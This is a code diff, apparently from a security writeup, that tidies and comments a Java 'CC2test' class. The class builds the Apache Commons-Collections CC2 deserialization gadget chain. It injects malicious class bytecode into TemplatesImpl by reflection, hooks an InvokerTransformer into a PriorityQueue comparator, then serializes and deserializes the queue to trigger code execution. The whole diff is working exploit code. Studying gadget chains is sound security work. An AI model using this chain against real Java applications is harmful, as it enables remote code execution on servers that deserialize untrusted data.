@@ -253,54 +253,62 @@ import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.PriorityQueue;
 
-
 public class CC2test {
 
-    public static void main(String[] args)throws Exception {
+    public static void main(String[] args) throws Exception {
+        // Instantiate TemplatesImpl
+        TemplatesImpl templates = new TemplatesImpl();
+        
+        // Get the Class object of TemplatesImpl
+        Class tc = templates.getClass();
+        
+        // Use reflection to access the private '_name' field
+        Field nameField = tc.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "aaaa");
+        
+        // Use reflection to access the private '_bytecodes' field
+        Field bytecodesField = tc.getDeclaredField("_bytecodes");
+        bytecodesField.setAccessible(true);
+        
+        // Read the malicious class bytecode file
+        byte[] code = Files.readAllBytes(Paths.get("D://tmp/test.class"));
+        byte[][] codes = { code };
+        bytecodesField.set(templates, codes);
 
+        // Prepare InvokerTransformer to invoke 'newTransformer()' via reflection
+        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
 
-        TemplatesImpl templates=new TemplatesImpl(); //实例化TemplatesImpl
-        Class tc=templates.getClass(); //获取templates的Classlass
-        Field nameField=tc.getDeclaredField("_name");//反射获取templates中的_name
-        nameField.setAccessible(true); //暴力反射
-        nameField.set(templates,"aaaa"); //修改_name的值
-        Field bytecodesField=tc.getDeclaredField("_bytecodes");//反射获取templates中的_bytecodes
-        bytecodesField.setAccessible(true); //暴力反射
-        byte[] code = Files.readAllBytes(Paths.get("D://tmp/test.class")); //获取恶意类
-        byte[][] codes={code};
-        bytecodesField.set(templates,codes);//修改_bytecodes的值
+        // Initialize TransformingComparator with a safe transformer to prevent premature triggering during local serialization
+        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
 
-        //反射调用newTransformer()
-        InvokerTransformer invokerTransformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
-
-        //将TransformingComparator置空 防止再序列化时触发恶意类
-        TransformingComparator transformingComparator=new TransformingComparator<>(new ConstantTransformer<>(1));
-
-
-        PriorityQueue priorityQueue=new PriorityQueue<>(transformingComparator);
-        //将恶意类添加给PriorityQueue
+        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
+        
+        // Add elements to PriorityQueue (this triggers the heapify and compare mechanism)
         priorityQueue.add(templates);
         priorityQueue.add(2);
 
-        //将invokerTransformer给transformingComparator中的transformer
-        Class c=transformingComparator.getClass();
-        Field transformField=c.getDeclaredField("transformer");
+        // Inject invokerTransformer into TransformingComparator's private 'transformer' field via reflection
+        Class c = transformingComparator.getClass();
+        Field transformField = c.getDeclaredField("transformer");
         transformField.setAccessible(true);
-        transformField.set(transformingComparator,invokerTransformer);
+        transformField.set(transformingComparator, invokerTransformer);
 
+        // Perform serialization and deserialization simulation
         serialize(priorityQueue);
         unserialize("ser.bin");
-
     }
 
-    public static void serialize(Object obj) throws Exception{
-        ObjectOutputStream oss=new ObjectOutputStream(new FileOutputStream("ser.bin"));
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oss = new ObjectOutputStream(new FileOutputStream("ser.bin"));
         oss.writeObject(obj);
+        oss.close();
     }
 
-    public static void unserialize(Object obj) throws Exception{
-        ObjectInputStream oss=new ObjectInputStream(new FileInputStream("ser.bin"));
+    public static void unserialize(String filename) throws Exception {
+        ObjectInputStream oss = new ObjectInputStream(new FileInputStream(filename));
         oss.readObject();
+        oss.close();
     }
 }
 ```
